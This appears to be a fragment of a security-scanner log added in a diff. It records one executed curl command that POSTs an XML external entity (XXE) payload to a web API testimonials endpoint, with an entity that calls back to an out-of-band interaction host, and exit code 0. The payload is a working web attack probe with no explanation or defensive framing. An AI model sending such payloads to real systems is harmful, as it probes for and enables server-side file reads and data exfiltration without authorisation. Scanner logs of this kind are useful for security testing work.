@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://oobba08b31583a9.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/xxe">]><r>&xxe;</r>' https://duck-store.escape.tech/api/v1/testimonials/13
+# exit_code: 0
+# ---
+
